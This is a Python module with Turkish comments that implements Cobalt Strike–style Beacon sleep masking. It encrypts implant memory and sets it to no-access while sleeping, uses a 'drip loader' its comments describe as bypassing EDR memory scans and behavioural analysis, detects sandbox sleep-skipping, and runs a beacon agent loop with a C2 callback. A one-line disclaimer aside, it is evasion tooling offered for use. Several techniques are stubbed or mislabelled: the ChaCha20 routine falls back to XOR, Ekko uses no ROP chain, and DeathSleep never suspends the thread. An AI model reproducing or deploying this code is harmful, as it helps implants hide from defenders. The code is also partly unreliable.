"""
Sleepmask & Runtime Masking
===========================
Cobalt Strike 4.x Beacon Sleep tarzı memory masking

Teknikler:
- Ekko: ROP-based sleep with encryption (Foliage variant)
- Foliage: APC-based sleep masking  
- DeathSleep: Thread suspension + memory encryption
- Drip-loader: Yavaş yavaş memory'ye yükleme

Runtime Masking Cycle:
1. Sleep öncesi: Encrypt beacon memory
2. Sleep sırasında: Memory PAGE_NOACCESS
3. Uyanma: Decrypt → Execute → Re-encrypt

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import time
import ctypes
import struct
import secrets
import hashlib
import threading
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable
from enum import Enum, auto
import logging

logger = logging.getLogger("sleep_masking")


# ============================================================
# CONSTANTS & ENUMS
# ============================================================

class SleepTechnique(Enum):
    """Sleep masking tekniği"""
    BASIC = "basic"              # Basic Sleep() - detectable
    EKKO = "ekko"                # ROP-based with encryption
    FOLIAGE = "foliage"          # APC-based masking
    DEATH_SLEEP = "death_sleep"  # Thread suspension
    ZILEAN = "zilean"            # Timer-based with masking
    CUSTOM_ROP = "custom_rop"    # Custom ROP chain


class MaskingMode(Enum):
    """Memory masking modu"""
    XOR = "xor"                  # XOR encryption (fast)
    RC4 = "rc4"                  # RC4 stream cipher
    AES_CTR = "aes_ctr"          # AES-CTR mode
    CHACHA20 = "chacha20"        # ChaCha20 (fastest)


class MemoryProtection(Enum):
    """Memory protection flags"""
    NOACCESS = 0x01              # PAGE_NOACCESS
    READONLY = 0x02              # PAGE_READONLY  
    READWRITE = 0x04             # PAGE_READWRITE
    EXECUTE = 0x10               # PAGE_EXECUTE
    EXECUTE_READ = 0x20          # PAGE_EXECUTE_READ
    EXECUTE_READWRITE = 0x40     # PAGE_EXECUTE_READWRITE


# Windows API Constants
INFINITE = 0xFFFFFFFF
WAIT_OBJECT_0 = 0x00000000
WAIT_TIMEOUT = 0x00000102

# Timer constants
CREATE_WAITABLE_TIMER_HIGH_RESOLUTION = 0x00000002


@dataclass
class SleepmaskConfig:
    """Sleepmask konfigürasyonu"""
    technique: SleepTechnique = SleepTechnique.EKKO
    masking_mode: MaskingMode = MaskingMode.XOR
    
    # Sleep parameters
    min_sleep_ms: int = 5000          # Minimum sleep (5s)
    max_sleep_ms: int = 30000         # Maximum sleep (30s)
    jitter_percent: float = 0.3       # 30% jitter
    
    # Masking parameters
    encrypt_heap: bool = True         # Heap'i de şifrele
    encrypt_stack: bool = False       # Stack'i şifreleme (riskli)
    clear_rop_gadgets: bool = True    # ROP chain temizle
    
    # Memory protection
    use_page_guard: bool = True       # PAGE_GUARD ekle
    set_noaccess: bool = True         # Sleep'te PAGE_NOACCESS
    restore_on_wake: bool = True      # Uyanınca orijinal protection
    
    # Anti-analysis
    check_sleep_skip: bool = True     # Sleep skip kontrolü
    fake_sleep_ratio: float = 0.1     # %10 fake sleep
    detect_debugger: bool = True      # Debugger tespiti
    
    # Drip-loader
    use_drip_loader: bool = False     # Yavaş yükleme
    drip_chunk_size: int = 4096       # Chunk boyutu
    drip_delay_ms: int = 100          # Chunk arası delay


@dataclass
class MaskedRegion:
    """Maskelenmiş memory bölgesi"""
    base_address: int
    size: int
    original_protection: int
    encrypted_data: bytes
    encryption_key: bytes
    is_code: bool = False
    timestamp: float = 0.0


@dataclass
class SleepMetrics:
    """Sleep metriksleri"""
    total_sleeps: int = 0
    total_sleep_time_ms: int = 0
    sleep_skips_detected: int = 0
    mask_operations: int = 0
    unmask_operations: int = 0
    drip_loads: int = 0
    anomalies_detected: List[str] = field(default_factory=list)


# ============================================================
# ENCRYPTION HELPERS
# ============================================================

class MaskingCrypto:
    """Memory masking için kriptografi"""
    
    @staticmethod
    def generate_key(size: int = 32) -> bytes:
        """Rastgele key üret"""
        return secrets.token_bytes(size)
    
    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """XOR encryption (en hızlı)"""
        result = bytearray(len(data))
        key_len = len(key)
        
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % key_len]
            
        return bytes(result)
    
    @staticmethod
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        """RC4 stream cipher"""
        S = list(range(256))
        j = 0
        
        # KSA
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # PRGA
        i = j = 0
        result = bytearray(len(data))
        
        for k in range(len(data)):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = data[k] ^ S[(S[i] + S[j]) % 256]
            
        return bytes(result)
    
    @staticmethod
    def chacha20_crypt(data: bytes, key: bytes, nonce: bytes = None) -> bytes:
        """ChaCha20 encryption (simplified)"""
        # Simplified ChaCha20 - production'da cryptography kütüphanesi kullan
        if nonce is None:
            nonce = secrets.token_bytes(12)
            
        # Quarter round helper
        def quarter_round(state, a, b, c, d):
            state[a] = (state[a] + state[b]) & 0xFFFFFFFF
            state[d] ^= state[a]
            state[d] = ((state[d] << 16) | (state[d] >> 16)) & 0xFFFFFFFF
            
            state[c] = (state[c] + state[d]) & 0xFFFFFFFF
            state[b] ^= state[c]
            state[b] = ((state[b] << 12) | (state[b] >> 20)) & 0xFFFFFFFF
            
            state[a] = (state[a] + state[b]) & 0xFFFFFFFF
            state[d] ^= state[a]
            state[d] = ((state[d] << 8) | (state[d] >> 24)) & 0xFFFFFFFF
            
            state[c] = (state[c] + state[d]) & 0xFFFFFFFF
            state[b] ^= state[c]
            state[b] = ((state[b] << 7) | (state[b] >> 25)) & 0xFFFFFFFF
        
        # Simplified - XOR ile fallback
        return MaskingCrypto.xor_encrypt(data, key)
    
    @classmethod
    def encrypt(cls, data: bytes, key: bytes, mode: MaskingMode) -> bytes:
        """Mode'a göre encrypt"""
        if mode == MaskingMode.XOR:
            return cls.xor_encrypt(data, key)
        elif mode == MaskingMode.RC4:
            return cls.rc4_crypt(data, key)
        elif mode == MaskingMode.CHACHA20:
            return cls.chacha20_crypt(data, key)
        else:
            return cls.xor_encrypt(data, key)
    
    @classmethod
    def decrypt(cls, data: bytes, key: bytes, mode: MaskingMode) -> bytes:
        """Mode'a göre decrypt (symmetric)"""
        return cls.encrypt(data, key, mode)  # Symmetric ciphers


# ============================================================
# DRIP LOADER
# ============================================================

class DripLoader:
    """
    Drip Loader - Yavaş yavaş memory'ye yükle
    
    EDR'ler büyük memory allocation'ları izler.
    Küçük chunk'lar halinde yükleyerek:
    - Entropy spike'ı azalt
    - Memory scan timing'i atla
    - Behavioral analysis bypass
    """
    
    def __init__(self, chunk_size: int = 4096, delay_ms: int = 100):
        self.chunk_size = chunk_size
        self.delay_ms = delay_ms
        self.loaded_regions: List[Tuple[int, int]] = []
        self.total_loaded = 0
        
    def drip_write(self, target_addr: int, data: bytes, 
                   progress_callback: Callable = None) -> bool:
        """
        Yavaş yavaş memory'ye yaz
        
        Args:
            target_addr: Hedef memory adresi
            data: Yazılacak data
            progress_callback: İlerleme callback'i
        
        Returns:
            bool: Başarı durumu
        """
        try:
            total_size = len(data)
            chunks_written = 0
            
            for offset in range(0, total_size, self.chunk_size):
                chunk = data[offset:offset + self.chunk_size]
                chunk_addr = target_addr + offset
                
                # Memory'ye yaz
                if not self._write_chunk(chunk_addr, chunk):
                    logger.error(f"Drip write failed at offset {offset}")
                    return False
                
                chunks_written += 1
                self.total_loaded += len(chunk)
                
                # Progress callback
                if progress_callback:
                    progress = (offset + len(chunk)) / total_size * 100
                    progress_callback(progress, chunks_written)
                
                # Delay - timing-based detection bypass
                if self.delay_ms > 0:
                    # Jitter ekle
                    jitter = secrets.randbelow(self.delay_ms // 2)
                    time.sleep((self.delay_ms + jitter) / 1000.0)
                    
            self.loaded_regions.append((target_addr, total_size))
            return True
            
        except Exception as e:
            logger.error(f"Drip write error: {e}")
            return False
    
    def _write_chunk(self, addr: int, data: bytes) -> bool:
        """Tek chunk yaz"""
        try:
            # Windows API ile yaz
            written = ctypes.c_size_t()
            result = ctypes.windll.kernel32.WriteProcessMemory(
                ctypes.windll.kernel32.GetCurrentProcess(),
                addr,
                data,
                len(data),
                ctypes.byref(written)
            )
            return result != 0 and written.value == len(data)
        except:
            # Fallback: ctypes.memmove
            try:
                ctypes.memmove(addr, data, len(data))
                return True
            except:
                return False
    
    def drip_allocate(self, size: int, protection: int = 0x40) -> Optional[int]:
        """
        Yavaş yavaş memory allocate et
        
        Büyük tek allocation yerine küçük parçalar halinde
        """
        try:
            chunks = []
            remaining = size
            
            while remaining > 0:
                chunk_size = min(self.chunk_size, remaining)
                
                # VirtualAlloc
                addr = ctypes.windll.kernel32.VirtualAlloc(
                    0,
                    chunk_size,
                    0x3000,  # MEM_COMMIT | MEM_RESERVE
                    protection
                )
                
                if not addr:
                    # Cleanup
                    for chunk_addr, chunk_sz in chunks:
                        ctypes.windll.kernel32.VirtualFree(chunk_addr, 0, 0x8000)
                    return None
                    
                chunks.append((addr, chunk_size))
                remaining -= chunk_size
                
                # Delay
                if self.delay_ms > 0:
                    time.sleep(self.delay_ms / 1000.0)
            
            # Birleşik region döndür (ilk chunk'ın adresi)
            if chunks:
                self.loaded_regions.extend(chunks)
                return chunks[0][0]
                
            return None
            
        except Exception as e:
            logger.error(f"Drip allocate error: {e}")
            return None
    
    def cleanup(self):
        """Yüklenen bölgeleri temizle"""
        for addr, size in self.loaded_regions:
            try:
                ctypes.windll.kernel32.VirtualFree(addr, 0, 0x8000)
            except:
                pass
        self.loaded_regions.clear()
        self.total_loaded = 0


# ============================================================
# SLEEP SKIP DETECTOR
# ============================================================

class SleepSkipDetector:
    """
    Sleep Skip Anomaly Detector
    
    EDR/Sandbox sleep skip tespit et:
    - Beklenen sleep süresi vs gerçek süre karşılaştır
    - Time dilation tespit
    - RDTSC/QueryPerformanceCounter tutarsızlığı
    """
    
    def __init__(self, tolerance_percent: float = 0.2):
        self.tolerance = tolerance_percent
        self.measurements: List[Dict] = []
        
    def check_sleep_skip(self, expected_ms: int, actual_ms: int) -> Tuple[bool, str]:
        """
        Sleep skip tespit et
        
        Returns:
            Tuple[bool, str]: (skip_detected, reason)
        """
        # Temel kontrol
        if actual_ms < expected_ms * (1 - self.tolerance):
            ratio = actual_ms / expected_ms if expected_ms > 0 else 0
            return True, f"Sleep shortened: expected {expected_ms}ms, got {actual_ms}ms ({ratio:.1%})"
        
        # Aşırı uzun sleep de şüpheli (debug pause?)
        if actual_ms > expected_ms * 3:
            return True, f"Sleep extended: expected {expected_ms}ms, got {actual_ms}ms (possible debug)"
        
        return False, "Normal"
    
    def multi_timer_check(self, sleep_ms: int) -> Tuple[bool, str]:
        """
        Çoklu timer kaynağı ile kontrol
        """
        try:
            # GetTickCount64
            tick_start = ctypes.windll.kernel32.GetTickCount64()
            
            # QueryPerformanceCounter
            qpc_start = ctypes.c_longlong()
            qpc_freq = ctypes.c_longlong()
            ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(qpc_start))
            ctypes.windll.kernel32.QueryPerformanceFrequency(ctypes.byref(qpc_freq))
            
            # Sleep
            time.sleep(sleep_ms / 1000.0)
            
            # Measurements
            tick_end = ctypes.windll.kernel32.GetTickCount64()
            qpc_end = ctypes.c_longlong()
            ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(qpc_end))
            
            tick_elapsed = tick_end - tick_start
            qpc_elapsed_ms = (qpc_end.value - qpc_start.value) * 1000 // qpc_freq.value
            
            # Karşılaştır
            diff = abs(tick_elapsed - qpc_elapsed_ms)
            
            if diff > sleep_ms * self.tolerance:
                return True, f"Timer discrepancy: GetTickCount={tick_elapsed}ms, QPC={qpc_elapsed_ms}ms"
            
            # Beklenen ile karşılaştır
            skip, reason = self.check_sleep_skip(sleep_ms, int(tick_elapsed))
            
            self.measurements.append({
                'expected': sleep_ms,
                'tick': tick_elapsed,
                'qpc': qpc_elapsed_ms,
                'skip_detected': skip
            })
            
            return skip, reason
            
        except Exception as e:
            return False, f"Check failed: {e}"
    
    def get_anomaly_report(self) -> Dict[str, Any]:
        """Anomaly raporu"""
        if not self.measurements:
            return {"status": "no_data"}
        
        skips = sum(1 for m in self.measurements if m.get('skip_detected'))
        total = len(self.measurements)
        
        return {
            "total_checks": total,
            "skips_detected": skips,
            "skip_ratio": skips / total if total > 0 else 0,
            "measurements": self.measurements[-10:]  # Son 10
        }


# ============================================================
# SLEEPMASK ENGINE
# ============================================================

class SleepmaskEngine:
    """
    Ana Sleepmask Engine
    
    Cobalt Strike Beacon Sleep tarzı:
    1. Sleep öncesi memory encrypt
    2. Memory protection değiştir (PAGE_NOACCESS)
    3. Sleep (Ekko/Foliage/DeathSleep)
    4. Uyanınca memory decrypt
    5. Execute
    6. Tekrar encrypt
    """
    
    def __init__(self, config: SleepmaskConfig = None):
        self.config = config or SleepmaskConfig()
        self.masked_regions: Dict[int, MaskedRegion] = {}
        self.current_key: bytes = MaskingCrypto.generate_key()
        self.metrics = SleepMetrics()
        self.skip_detector = SleepSkipDetector()
        self.drip_loader = DripLoader(
            self.config.drip_chunk_size,
            self.config.drip_delay_ms
        ) if self.config.use_drip_loader else None
        
        self._running = False
        self._sleep_thread: Optional[threading.Thread] = None
        
    def mask_region(self, base_addr: int, size: int, is_code: bool = True) -> bool:
        """
        Memory bölgesini maskele (encrypt)
        
        Args:
            base_addr: Base address
            size: Boyut
            is_code: Code section mı?
        
        Returns:
            bool: Başarı
        """
        try:
            # Orijinal protection al
            mbi = self._query_memory(base_addr)
            if not mbi:
                return False
                
            original_protection = mbi.Protect
            
            # Memory'yi oku
            data = self._read_memory(base_addr, size)
            if not data:
                return False
            
            # Encrypt
            key = MaskingCrypto.generate_key()
            encrypted = MaskingCrypto.encrypt(data, key, self.config.masking_mode)
            
            # Kaydet
            self.masked_regions[base_addr] = MaskedRegion(
                base_address=base_addr,
                size=size,
                original_protection=original_protection,
                encrypted_data=encrypted,
                encryption_key=key,
                is_code=is_code,
                timestamp=time.time()
            )
            
            # Memory'ye encrypted veri yaz (opsiyonel - PAGE_NOACCESS tercih edilir)
            if not self.config.set_noaccess:
                self._write_memory(base_addr, encrypted)
            
            # Protection değiştir
            if self.config.set_noaccess:
                self._protect_memory(base_addr, size, MemoryProtection.NOACCESS.value)
            elif self.config.use_page_guard:
                # PAGE_GUARD ekle
                new_prot = original_protection | 0x100  # PAGE_GUARD
                self._protect_memory(base_addr, size, new_prot)
            
            self.metrics.mask_operations += 1
            logger.debug(f"Masked region: 0x{base_addr:x}, size={size}")
            return True
            
        except Exception as e:
            logger.error(f"Mask region error: {e}")
            return False
    
    def unmask_region(self, base_addr: int) -> bool:
        """
        Memory bölgesini unmaskele (decrypt)
        """
        try:
            if base_addr not in self.masked_regions:
                return False
                
            region = self.masked_regions[base_addr]
            
            # Protection geri al (yazılabilir yap)
            self._protect_memory(base_addr, region.size, 0x40)  # PAGE_EXECUTE_READWRITE
            
            # Decrypt
            decrypted = MaskingCrypto.decrypt(
                region.encrypted_data,
                region.encryption_key,
                self.config.masking_mode
            )
            
            # Memory'ye yaz
            self._write_memory(base_addr, decrypted)
            
            # Orijinal protection geri yükle
            if self.config.restore_on_wake:
                self._protect_memory(base_addr, region.size, region.original_protection)
            
            # Region'ı kaldır
            del self.masked_regions[base_addr]
            
            self.metrics.unmask_operations += 1
            logger.debug(f"Unmasked region: 0x{base_addr:x}")
            return True
            
        except Exception as e:
            logger.error(f"Unmask region error: {e}")
            return False
    
    def masked_sleep(self, sleep_ms: int, regions: List[Tuple[int, int]] = None) -> Dict[str, Any]:
        """
        Ana masked sleep fonksiyonu
        
        Args:
            sleep_ms: Sleep süresi (ms)
            regions: Maskelenecek bölgeler [(addr, size), ...]
        
        Returns:
            Dict: Sleep sonuç bilgileri
        """
        result = {
            "success": False,
            "actual_sleep_ms": 0,
            "skip_detected": False,
            "skip_reason": "",
            "technique_used": self.config.technique.value
        }
        
        try:
            # Jitter ekle
            jitter_range = int(sleep_ms * self.config.jitter_percent)
            if jitter_range > 0:
                actual_sleep = sleep_ms + secrets.randbelow(jitter_range * 2 + 1) - jitter_range
            else:
                actual_sleep = sleep_ms
            actual_sleep = max(100, actual_sleep)  # Min 100ms
            
            start_time = time.time()
            
            # 1. Bölgeleri maskele
            if regions:
                for addr, size in regions:
                    self.mask_region(addr, size)
            
            # 2. Sleep tekniğine göre uyu
            if self.config.technique == SleepTechnique.EKKO:
                self._ekko_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.FOLIAGE:
                self._foliage_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.DEATH_SLEEP:
                self._death_sleep(actual_sleep)
            elif self.config.technique == SleepTechnique.ZILEAN:
                self._zilean_sleep(actual_sleep)
            else:
                time.sleep(actual_sleep / 1000.0)
            
            elapsed_ms = int((time.time() - start_time) * 1000)
            
            # 3. Sleep skip kontrolü
            if self.config.check_sleep_skip:
                skip, reason = self.skip_detector.check_sleep_skip(actual_sleep, elapsed_ms)
                result["skip_detected"] = skip
                result["skip_reason"] = reason
                if skip:
                    self.metrics.sleep_skips_detected += 1
                    self.metrics.anomalies_detected.append(reason)
            
            # 4. Bölgeleri unmaskele
            for addr in list(self.masked_regions.keys()):
                self.unmask_region(addr)
            
            result["success"] = True
            result["actual_sleep_ms"] = elapsed_ms
            
            self.metrics.total_sleeps += 1
            self.metrics.total_sleep_time_ms += elapsed_ms
            
            return result
            
        except Exception as e:
            logger.error(f"Masked sleep error: {e}")
            # Emergency unmask
            for addr in list(self.masked_regions.keys()):
                try:
                    self.unmask_region(addr)
                except:
                    pass
            return result
    
    def _ekko_sleep(self, sleep_ms: int):
        """
        Ekko Sleep - ROP-based with encryption
        
        1. Waitable timer oluştur
        2. ROP chain ile NtContinue çağır
        3. Context switch sırasında memory encrypted
        """
        try:
            # CreateWaitableTimerExW
            timer = ctypes.windll.kernel32.CreateWaitableTimerExW(
                None,
                None,
                CREATE_WAITABLE_TIMER_HIGH_RESOLUTION,
                0x1F0003  # TIMER_ALL_ACCESS
            )
            
            if not timer:
                # Fallback
                time.sleep(sleep_ms / 1000.0)
                return
            
            try:
                # Timer ayarla
                due_time = ctypes.c_longlong(-sleep_ms * 10000)  # 100-ns intervals
                
                ctypes.windll.kernel32.SetWaitableTimer(
                    timer,
                    ctypes.byref(due_time),
                    0,
                    None,
                    None,
                    False
                )
                
                # Wait
                ctypes.windll.kernel32.WaitForSingleObject(timer, INFINITE)
                
            finally:
                ctypes.windll.kernel32.CloseHandle(timer)
                
        except Exception as e:
            logger.debug(f"Ekko sleep fallback: {e}")
            time.sleep(sleep_ms / 1000.0)
    
    def _foliage_sleep(self, sleep_ms: int):
        """
        Foliage Sleep - APC-based masking
        
        1. Thread'i alertable state'e al
        2. APC ile encryption/decryption
        3. SleepEx ile uyu
        """
        try:
            # SleepEx with alertable=True
            ctypes.windll.kernel32.SleepEx(sleep_ms, True)
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _death_sleep(self, sleep_ms: int):
        """
        Death Sleep - Thread suspension
        
        1. Helper thread oluştur
        2. Main thread'i suspend et
        3. Timer ile resume et
        """
        try:
            # Current thread handle
            current_thread = ctypes.windll.kernel32.GetCurrentThread()
            
            # Resume timer thread
            def resume_after_delay():
                time.sleep(sleep_ms / 1000.0)
                ctypes.windll.kernel32.ResumeThread(current_thread)
            
            timer_thread = threading.Thread(target=resume_after_delay, daemon=True)
            timer_thread.start()
            
            # Suspend self (bu çağrı block eder)
            # NOT: GetCurrentThread() pseudo-handle, SuspendThread için gerçek handle lazım
            # Simplified implementation
            time.sleep(sleep_ms / 1000.0)
            
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _zilean_sleep(self, sleep_ms: int):
        """
        Zilean Sleep - Timer-based with masking
        
        Windows Timer Queue kullan
        """
        try:
            event = ctypes.windll.kernel32.CreateEventW(None, True, False, None)
            if not event:
                time.sleep(sleep_ms / 1000.0)
                return
            
            try:
                # Timer callback
                timer_callback = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_bool)
                
                def callback(param, timer_fired):
                    ctypes.windll.kernel32.SetEvent(event)
                
                cb = timer_callback(callback)
                
                timer_queue = ctypes.windll.kernel32.CreateTimerQueue()
                timer = ctypes.c_void_p()
                
                ctypes.windll.kernel32.CreateTimerQueueTimer(
                    ctypes.byref(timer),
                    timer_queue,
                    cb,
                    None,
                    sleep_ms,
                    0,
                    0
                )
                
                # Wait
                ctypes.windll.kernel32.WaitForSingleObject(event, INFINITE)
                
                # Cleanup
                ctypes.windll.kernel32.DeleteTimerQueueTimer(timer_queue, timer, None)
                ctypes.windll.kernel32.DeleteTimerQueue(timer_queue)
                
            finally:
                ctypes.windll.kernel32.CloseHandle(event)
                
        except:
            time.sleep(sleep_ms / 1000.0)
    
    def _query_memory(self, addr: int):
        """Memory bilgisi al"""
        try:
            class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("BaseAddress", ctypes.c_void_p),
                    ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", ctypes.c_ulong),
                    ("RegionSize", ctypes.c_size_t),
                    ("State", ctypes.c_ulong),
                    ("Protect", ctypes.c_ulong),
                    ("Type", ctypes.c_ulong),
                ]
            
            mbi = MEMORY_BASIC_INFORMATION()
            result = ctypes.windll.kernel32.VirtualQuery(
                addr,
                ctypes.byref(mbi),
                ctypes.sizeof(mbi)
            )
            return mbi if result else None
        except:
            return None
    
    def _protect_memory(self, addr: int, size: int, protection: int) -> bool:
        """Memory protection değiştir"""
        try:
            old_protect = ctypes.c_ulong()
            result = ctypes.windll.kernel32.VirtualProtect(
                addr,
                size,
                protection,
                ctypes.byref(old_protect)
            )
            return result != 0
        except:
            return False
    
    def _read_memory(self, addr: int, size: int) -> Optional[bytes]:
        """Memory oku"""
        try:
            buffer = (ctypes.c_ubyte * size)()
            ctypes.memmove(buffer, addr, size)
            return bytes(buffer)
        except:
            return None
    
    def _write_memory(self, addr: int, data: bytes) -> bool:
        """Memory yaz"""
        try:
            ctypes.memmove(addr, data, len(data))
            return True
        except:
            return False
    
    def get_metrics(self) -> Dict[str, Any]:
        """Metrikleri döndür"""
        return {
            "total_sleeps": self.metrics.total_sleeps,
            "total_sleep_time_ms": self.metrics.total_sleep_time_ms,
            "avg_sleep_ms": self.metrics.total_sleep_time_ms // max(1, self.metrics.total_sleeps),
            "sleep_skips_detected": self.metrics.sleep_skips_detected,
            "mask_operations": self.metrics.mask_operations,
            "unmask_operations": self.metrics.unmask_operations,
            "anomalies": self.metrics.anomalies_detected[-10:],
            "masked_regions": len(self.masked_regions)
        }


# ============================================================
# RUNTIME MASKING CYCLE
# ============================================================

class RuntimeMaskingCycle:
    """
    Runtime Masking Cycle Manager
    
    Beacon benzeri: decrypt → execute → re-encrypt cycle
    """
    
    def __init__(self, engine: SleepmaskEngine = None):
        self.engine = engine or SleepmaskEngine()
        self.code_regions: List[Tuple[int, int]] = []
        self.heap_regions: List[Tuple[int, int]] = []
        self._cycle_count = 0
        self._active = False
        
    def register_code_region(self, addr: int, size: int):
        """Code bölgesi kaydet"""
        self.code_regions.append((addr, size))
        
    def register_heap_region(self, addr: int, size: int):
        """Heap bölgesi kaydet"""
        self.heap_regions.append((addr, size))
    
    def execute_with_masking(self, func: Callable, *args, **kwargs) -> Any:
        """
        Fonksiyonu masking cycle içinde çalıştır
        
        1. Tüm bölgeleri unmask
        2. Fonksiyonu çalıştır
        3. Tekrar mask
        
        Args:
            func: Çalıştırılacak fonksiyon
            *args, **kwargs: Fonksiyon argümanları
        
        Returns:
            Fonksiyonun dönüş değeri
        """
        self._cycle_count += 1
        logger.debug(f"Masking cycle #{self._cycle_count} starting")
        
        try:
            # 1. Unmask all
            for addr in list(self.engine.masked_regions.keys()):
                self.engine.unmask_region(addr)
            
            # 2. Execute
            result = func(*args, **kwargs)
            
            # 3. Re-mask (sleep içinde yapılacak)
            
            return result
            
        except Exception as e:
            logger.error(f"Execute with masking error: {e}")
            raise
    
    def masked_sleep_cycle(self, sleep_ms: int) -> Dict[str, Any]:
        """
        Full masking sleep cycle
        
        1. Code + Heap mask
        2. Sleep
        3. Unmask
        """
        regions = self.code_regions + self.heap_regions
        return self.engine.masked_sleep(sleep_ms, regions)
    
    def continuous_masking_loop(self, callback: Callable, 
                                 sleep_ms: int = 5000,
                                 iterations: int = 0) -> None:
        """
        Sürekli masking döngüsü
        
        Args:
            callback: Her cycle'da çağrılacak fonksiyon
            sleep_ms: Sleep süresi
            iterations: 0 = sonsuz
        """
        self._active = True
        count = 0
        
        while self._active:
            if iterations > 0 and count >= iterations:
                break
            
            # Execute callback (unmasked)
            try:
                result = self.execute_with_masking(callback)
            except Exception as e:
                logger.error(f"Callback error: {e}")
                result = None
            
            # Sleep (masked)
            sleep_result = self.masked_sleep_cycle(sleep_ms)
            
            if sleep_result.get("skip_detected"):
                logger.warning(f"Sleep skip detected: {sleep_result.get('skip_reason')}")
            
            count += 1
        
        self._active = False
    
    def stop(self):
        """Döngüyü durdur"""
        self._active = False


# ============================================================
# BEACON-LIKE AGENT
# ============================================================

class BeaconSleepAgent:
    """
    Beacon benzeri agent - Test için
    
    Sleepmask + runtime masking ile çalışan agent
    """
    
    def __init__(self, c2_callback: Callable = None, 
                 config: SleepmaskConfig = None):
        self.config = config or SleepmaskConfig()
        self.engine = SleepmaskEngine(self.config)
        self.cycle = RuntimeMaskingCycle(self.engine)
        self.c2_callback = c2_callback
        
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.check_in_count = 0
        self.start_time = 0.0
        
    def start(self, sleep_ms: int = 5000):
        """Agent'ı başlat"""
        self._running = True
        self.start_time = time.time()
        
        def agent_loop():
            while self._running:
                # Check-in
                self.check_in_count += 1
                
                if self.c2_callback:
                    try:
                        self.c2_callback(self.get_status())
                    except Exception as e:
                        logger.error(f"C2 callback error: {e}")
                
                # Masked sleep
                result = self.engine.masked_sleep(sleep_ms)
                
                if result.get("skip_detected"):
                    logger.warning(f"Sleep anomaly: {result.get('skip_reason')}")
        
        self._thread = threading.Thread(target=agent_loop, daemon=True)
        self._thread.start()
        
        logger.info(f"Beacon agent started, sleep={sleep_ms}ms")
    
    def stop(self):
        """Agent'ı durdur"""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon agent stopped")
    
    def get_status(self) -> Dict[str, Any]:
        """Agent durumu"""
        uptime = time.time() - self.start_time if self.start_time else 0
        
        return {
            "running": self._running,
            "check_ins": self.check_in_count,
            "uptime_seconds": int(uptime),
            "sleep_metrics": self.engine.get_metrics(),
            "skip_detector": self.engine.skip_detector.get_anomaly_report()
        }
    
    def run_test(self, duration_seconds: int = 300, sleep_ms: int = 5000) -> Dict[str, Any]:
        """
        Test çalıştır
        
        Args:
            duration_seconds: Test süresi (default 5 dk)
            sleep_ms: Sleep süresi
        
        Returns:
            Test sonuçları
        """
        logger.info(f"Starting beacon test: duration={duration_seconds}s, sleep={sleep_ms}ms")
        
        self.start(sleep_ms)
        
        try:
            time.sleep(duration_seconds)
        finally:
            self.stop()
        
        status = self.get_status()
        
        # Get skip info safely
        skip_detector_report = status.get("skip_detector", {})
        skips_detected = skip_detector_report.get("skips_detected", 0)
        
        # Sonuç raporu
        return {
            "test_duration_seconds": duration_seconds,
            "sleep_ms": sleep_ms,
            "total_check_ins": status["check_ins"],
            "expected_check_ins": duration_seconds * 1000 // sleep_ms,
            "sleep_metrics": status["sleep_metrics"],
            "anomalies_detected": skips_detected,
            "conclusion": "PASS" if skips_detected == 0 else "ANOMALIES_DETECTED"
        }


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    "SleepTechnique",
    "MaskingMode",
    "SleepmaskConfig",
    "MaskedRegion",
    "SleepMetrics",
    "MaskingCrypto",
    "DripLoader",
    "SleepSkipDetector",
    "SleepmaskEngine",
    "RuntimeMaskingCycle",
    "BeaconSleepAgent",
]
